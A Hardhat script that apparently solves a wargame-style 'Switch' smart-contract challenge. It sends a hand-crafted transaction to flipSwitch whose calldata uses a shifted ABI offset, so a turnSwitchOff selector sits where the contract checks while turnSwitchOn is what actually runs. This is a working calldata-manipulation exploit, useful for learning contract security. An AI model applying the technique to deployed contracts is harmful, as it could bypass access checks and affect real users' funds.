const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x5821Aa342bd011E0E77aC5eb8663B052592363a5";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const contractInterface = [
  {
    inputs: [
      {
        internalType: "bytes",
        name: "_data",
        type: "bytes",
      },
    ],
    name: "flipSwitch",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x30c13ade",
  },
  {
    inputs: [],
    name: "offSelector",
    outputs: [
      {
        internalType: "bytes4",
        name: "",
        type: "bytes4",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x5a2cfa66",
  },
  {
    inputs: [],
    name: "switchOn",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xf9f8f895",
  },
  {
    inputs: [],
    name: "turnSwitchOff",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x20606e15",
  },
  {
    inputs: [],
    name: "turnSwitchOn",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x76227e12",
  },
];

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const Switch = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    signer
  );
  console.log(
    "Before function call switchOn variable status---->",
    await Switch.switchOn()
  );

  const tx = {
    to: CONTRACT_ADDRESS,
    data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000",
  };

  await signer.sendTransaction(tx);

  console.log(
    "after function call switchOn variable status---->",
    await Switch.switchOn()
  );
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
